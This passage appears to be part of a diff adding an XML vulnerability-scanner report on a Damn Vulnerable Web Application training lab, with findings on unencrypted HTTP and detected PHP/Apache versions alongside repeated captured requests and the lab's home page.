+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 7437
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:18:07 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='.'" class="selected"><a href=".">Home</a></li>
+<li onclick="window.location='instructions.php'" class=""><a href="instructions.php">Instructions</a></li>
+<li onclick="window.location='setup.php'" class=""><a href="setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='vulnerabilities/brute/'" class=""><a href="vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='vulnerabilities/exec/'" class=""><a href="vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='vulnerabilities/csrf/'" class=""><a href="vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='vulnerabilities/fi/.?page=include.php'" class=""><a href="vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='vulnerabilities/upload/'" class=""><a href="vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='vulnerabilities/captcha/'" class=""><a href="vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='vulnerabilities/sqli/'" class=""><a href="vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='vulnerabilities/sqli_blind/'" class=""><a href="vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='vulnerabilities/weak_id/'" class=""><a href="vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='vulnerabilities/xss_d/'" class=""><a href="vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='vulnerabilities/xss_r/'" class=""><a href="vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='vulnerabilities/xss_s/'" class=""><a href="vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='security.php'" class=""><a href="security.php">DVWA Security</a></li>
+<li onclick="window.location='phpinfo.php'" class=""><a href="phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='about.php'" class=""><a href="about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='logout.php'" class=""><a href="logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Welcome to Damn Vulnerable Web Application!</h1>
+	<p>Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.</p>
+	<p>The aim of DVWA is to <em>practice some of the most common web vulnerabilities</em>, with <em>various levels of difficultly</em>, with a simple straightforward interface.</p>
+	<hr />
+	<br />
+
+	<h2>General Instructions</h2>
+	<p>It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.</p>
+	<p>Please note, there are <em>both documented and undocumented vulnerability</em> with this software. This is intentional. You are encouraged to try and discover as many issues as possible.</p>
+	<p>DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty. This will demonstrate how adding another layer of security may block certain malicious actions. Note, there are also various public methods at bypassing these protections (so this can be seen as an extension for more advanced users)!</p>
+	<p>There is a help button at the bottom of each page, which allows you to view hints & tips for that vulnerability. There are also additional links for further background reading, which relates to that security issue.</p>
+	<hr />
+	<br />
+
+	<h2>WARNING!</h2>
+	<p>Damn Vulnerable Web Application is damn vulnerable! <em>Do not upload it to your hosting provider's public html folder or any Internet facing servers</em>, as they will be compromised. It is recommend using a virtual machine (such as <a href="https://www.virtualbox.org/" target="_blank">VirtualBox</a> or <a href="https://www.vmware.com/" target="_blank">VMware</a>), which is set to NAT networking mode. Inside a guest machine, you can downloading and install <a href="https://www.apachefriends.org/en/xampp.html" target="_blank">XAMPP</a> for the web server and database.</p>
+	<br />
+	<h3>Disclaimer</h3>
+	<p>We do not take responsibility for the way in which any one uses this application (DVWA). We have made the purposes of the application clear and it should not be used maliciously. We have given warnings and taken measures to prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation of DVWA it is not our responsibility it is the responsibility of the person/s who uploaded and installed it.</p>
+	<hr />
+	<br />
+
+	<h2>More Training Resources</h2>
+	<p>DVWA aims to cover the most commonly seen vulnerabilities found in today's web applications. However there are plenty of other issues with web applications. Should you wish to explore any additional attack vectors, or want more difficult challenges, you may wish to look into the following other projects:</p>
+	<ul>
+		<li><a href="http://www.itsecgames.com/" target="_blank">bWAPP</a></li>
+		<li><a href="http://sourceforge.net/projects/mutillidae/files/mutillidae-project/" target="_blank">NOWASP</a> (formerly known as <a href="http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10" target="_blank">Mutillidae</a>)</li>
+		<li><a href="https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project" target="_blank">OWASP Broken Web Applications Project
+</a></li>
+	</ul>
+	<hr />
+	<br />
+</div>
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6997056099631449088</serialNumber>
+    <type>16777728</type>
+    <name><![CDATA[Unencrypted communications]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/]]></path>
+    <location><![CDATA[/]]></location>
+    <severity>Medium</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>The application allows users to connect to it over unencrypted connections.  An attacker suitably positioned to view a legitimate user's network traffic could record and monitor their interactions with the application and obtain any information the user supplies. Furthermore, an attacker able to modify traffic could use the application as a platform for attacks against its users and third-party websites. Unencrypted connections have been exploited by ISPs and governments to track users, and to inject adverts and malicious JavaScript. Due to these concerns, web browser vendors are planning to visually flag unencrypted connections as hazardous.</p>
+<p>
+To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.
+</p>
+<p>Please note that using a mixture of encrypted and unencrypted communications is an ineffective defense against active attackers, because they can easily remove references to encrypted resources when these references are transmitted over an unencrypted connection.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Applications should use transport-level encryption (SSL/TLS) to protect all communications passing between the client and the server. The Strict-Transport-Security HTTP header should be used to ensure that clients refuse to access the server over an insecure connection.</p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href="https://www.chromium.org/Home/chromium-security/marking-http-as-non-secure">Marking HTTP as non-secure</a></li>
+<li><a href="https://wiki.mozilla.org/Security/Server_Side_TLS">Configuring Server-Side SSL/TLS</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security">HTTP Strict Transport Security</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/326.html">CWE-326: Inadequate Encryption Strength</a></li>
+</ul>]]></vulnerabilityClassifications>
+  </issue>
+  <issue>
+    <serialNumber>1793265179086820352</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[[Vulners] Software detected]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/]]></path>
+    <location><![CDATA[/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground></issueBackground>
+    <remediationBackground></remediationBackground>
+    <issueDetail><![CDATA[The following software was detected <b>PHP, headers - 5.5.9-1ubuntu4.25</b>
+No vulnerabilities found for current version.]]></issueDetail>
+    <remediationDetail></remediationDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET / HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 7437
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:18:07 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='.'" class="selected"><a href=".">Home</a></li>
+<li onclick="window.location='instructions.php'" class=""><a href="instructions.php">Instructions</a></li>
+<li onclick="window.location='setup.php'" class=""><a href="setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='vulnerabilities/brute/'" class=""><a href="vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='vulnerabilities/exec/'" class=""><a href="vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='vulnerabilities/csrf/'" class=""><a href="vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='vulnerabilities/fi/.?page=include.php'" class=""><a href="vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='vulnerabilities/upload/'" class=""><a href="vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='vulnerabilities/captcha/'" class=""><a href="vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='vulnerabilities/sqli/'" class=""><a href="vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='vulnerabilities/sqli_blind/'" class=""><a href="vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='vulnerabilities/weak_id/'" class=""><a href="vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='vulnerabilities/xss_d/'" class=""><a href="vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='vulnerabilities/xss_r/'" class=""><a href="vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='vulnerabilities/xss_s/'" class=""><a href="vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='security.php'" class=""><a href="security.php">DVWA Security</a></li>
+<li onclick="window.location='phpinfo.php'" class=""><a href="phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='about.php'" class=""><a href="about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='logout.php'" class=""><a href="logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Welcome to Damn Vulnerable Web Application!</h1>
+	<p>Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.</p>
+	<p>The aim of DVWA is to <em>practice some of the most common web vulnerabilities</em>, with <em>various levels of difficultly</em>, with a simple straightforward interface.</p>
+	<hr />
+	<br />
+
+	<h2>General Instructions</h2>
+	<p>It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.</p>
+	<p>Please note, there are <em>both documented and undocumented vulnerability</em> with this software. This is intentional. You are encouraged to try and discover as many issues as possible.</p>
+	<p>DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty. This will demonstrate how adding another layer of security may block certain malicious actions. Note, there are also various public methods at bypassing these protections (so this can be seen as an extension for more advanced users)!</p>
+	<p>There is a help button at the bottom of each page, which allows you to view hints & tips for that vulnerability. There are also additional links for further background reading, which relates to that security issue.</p>
+	<hr />
+	<br />
+
+	<h2>WARNING!</h2>
+	<p>Damn Vulnerable Web Application is damn vulnerable! <em>Do not upload it to your hosting provider's public html folder or any Internet facing servers</em>, as they will be compromised. It is recommend using a virtual machine (such as <a href="https://www.virtualbox.org/" target="_blank">VirtualBox</a> or <a href="https://www.vmware.com/" target="_blank">VMware</a>), which is set to NAT networking mode. Inside a guest machine, you can downloading and install <a href="https://www.apachefriends.org/en/xampp.html" target="_blank">XAMPP</a> for the web server and database.</p>
+	<br />
+	<h3>Disclaimer</h3>
+	<p>We do not take responsibility for the way in which any one uses this application (DVWA). We have made the purposes of the application clear and it should not be used maliciously. We have given warnings and taken measures to prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation of DVWA it is not our responsibility it is the responsibility of the person/s who uploaded and installed it.</p>
+	<hr />
+	<br />
+
+	<h2>More Training Resources</h2>
+	<p>DVWA aims to cover the most commonly seen vulnerabilities found in today's web applications. However there are plenty of other issues with web applications. Should you wish to explore any additional attack vectors, or want more difficult challenges, you may wish to look into the following other projects:</p>
+	<ul>
+		<li><a href="http://www.itsecgames.com/" target="_blank">bWAPP</a></li>
+		<li><a href="http://sourceforge.net/projects/mutillidae/files/mutillidae-project/" target="_blank">NOWASP</a> (formerly known as <a href="http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10" target="_blank">Mutillidae</a>)</li>
+		<li><a href="https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project" target="_blank">OWASP Broken Web Applications Project
+</a></li>
+	</ul>
+	<hr />
+	<br />
+</div>
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>2805390291284483072</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[[Vulners] Software detected]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/]]></path>
+    <location><![CDATA[/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground></issueBackground>
+    <remediationBackground></remediationBackground>
+    <issueDetail><![CDATA[The following software was detected <b>Apache, headers - null</b>
+No vulnerabilities found for current version.]]></issueDetail>
+    <remediationDetail></remediationDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET / HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 7437
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:18:07 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="favicon.ico" />
+
+		<script type="text/javascript" src="dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li onclick="window.location='.'" class="selected"><a href=".">Home</a></li>
+<li onclick="window.location='instructions.php'" class=""><a href="instructions.php">Instructions</a></li>
+<li onclick="window.location='setup.php'" class=""><a href="setup.php">Setup / Reset DB</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='vulnerabilities/brute/'" class=""><a href="vulnerabilities/brute/">Brute Force</a></li>
+<li onclick="window.location='vulnerabilities/exec/'" class=""><a href="vulnerabilities/exec/">Command Injection</a></li>
+<li onclick="window.location='vulnerabilities/csrf/'" class=""><a href="vulnerabilities/csrf/">CSRF</a></li>
+<li onclick="window.location='vulnerabilities/fi/.?page=include.php'" class=""><a href="vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
+<li onclick="window.location='vulnerabilities/upload/'" class=""><a href="vulnerabilities/upload/">File Upload</a></li>
+<li onclick="window.location='vulnerabilities/captcha/'" class=""><a href="vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
+<li onclick="window.location='vulnerabilities/sqli/'" class=""><a href="vulnerabilities/sqli/">SQL Injection</a></li>
+<li onclick="window.location='vulnerabilities/sqli_blind/'" class=""><a href="vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
+<li onclick="window.location='vulnerabilities/weak_id/'" class=""><a href="vulnerabilities/weak_id/">Weak Session IDs</a></li>
+<li onclick="window.location='vulnerabilities/xss_d/'" class=""><a href="vulnerabilities/xss_d/">XSS (DOM)</a></li>
+<li onclick="window.location='vulnerabilities/xss_r/'" class=""><a href="vulnerabilities/xss_r/">XSS (Reflected)</a></li>
+<li onclick="window.location='vulnerabilities/xss_s/'" class=""><a href="vulnerabilities/xss_s/">XSS (Stored)</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='security.php'" class=""><a href="security.php">DVWA Security</a></li>
+<li onclick="window.location='phpinfo.php'" class=""><a href="phpinfo.php">PHP Info</a></li>
+<li onclick="window.location='about.php'" class=""><a href="about.php">About</a></li>
+</ul><ul class="menuBlocks"><li onclick="window.location='logout.php'" class=""><a href="logout.php">Logout</a></li>
+</ul>
+				</div>
+
+			</div>
+
+			<div id="main_body">
+
+				
+<div class="body_padded">
+	<h1>Welcome to Damn Vulnerable Web Application!</h1>
+	<p>Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment.</p>
+	<p>The aim of DVWA is to <em>practice some of the most common web vulnerabilities</em>, with <em>various levels of difficultly</em>, with a simple straightforward interface.</p>
+	<hr />
+	<br />
+
+	<h2>General Instructions</h2>
+	<p>It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.</p>
+	<p>Please note, there are <em>both documented and undocumented vulnerability</em> with this software. This is intentional. You are encouraged to try and discover as many issues as possible.</p>
+	<p>DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty. This will demonstrate how adding another layer of security may block certain malicious actions. Note, there are also various public methods at bypassing these protections (so this can be seen as an extension for more advanced users)!</p>
+	<p>There is a help button at the bottom of each page, which allows you to view hints & tips for that vulnerability. There are also additional links for further background reading, which relates to that security issue.</p>
+	<hr />
+	<br />
+
+	<h2>WARNING!</h2>
+	<p>Damn Vulnerable Web Application is damn vulnerable! <em>Do not upload it to your hosting provider's public html folder or any Internet facing servers</em>, as they will be compromised. It is recommend using a virtual machine (such as <a href="https://www.virtualbox.org/" target="_blank">VirtualBox</a> or <a href="https://www.vmware.com/" target="_blank">VMware</a>), which is set to NAT networking mode. Inside a guest machine, you can downloading and install <a href="https://www.apachefriends.org/en/xampp.html" target="_blank">XAMPP</a> for the web server and database.</p>
+	<br />
+	<h3>Disclaimer</h3>
+	<p>We do not take responsibility for the way in which any one uses this application (DVWA). We have made the purposes of the application clear and it should not be used maliciously. We have given warnings and taken measures to prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation of DVWA it is not our responsibility it is the responsibility of the person/s who uploaded and installed it.</p>
+	<hr />
+	<br />
+
+	<h2>More Training Resources</h2>
+	<p>DVWA aims to cover the most commonly seen vulnerabilities found in today's web applications. However there are plenty of other issues with web applications. Should you wish to explore any additional attack vectors, or want more difficult challenges, you may wish to look into the following other projects:</p>
+	<ul>
+		<li><a href="http://www.itsecgames.com/" target="_blank">bWAPP</a></li>
+		<li><a href="http://sourceforge.net/projects/mutillidae/files/mutillidae-project/" target="_blank">NOWASP</a> (formerly known as <a href="http://www.irongeek.com/i.php?page=mutillidae/mutillidae-deliberately-vulnerable-php-owasp-top-10" target="_blank">Mutillidae</a>)</li>
+		<li><a href="https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project" target="_blank">OWASP Broken Web Applications Project
+</a></li>
+	</ul>
+	<hr />
+	<br />
+</div>
+				<br /><br />
+				
+
+			</div>
+
+			<div class="clear">
+			</div>
+
+			<div id="system_info">
+				<div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> impossible<br /><em>PHPIDS:</em> disabled</div>
+			</div>
+
+			<div id="footer">
+
+				<p>Damn Vulnerable Web Application (DVWA) v1.10 *Development*</p>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+</issues>
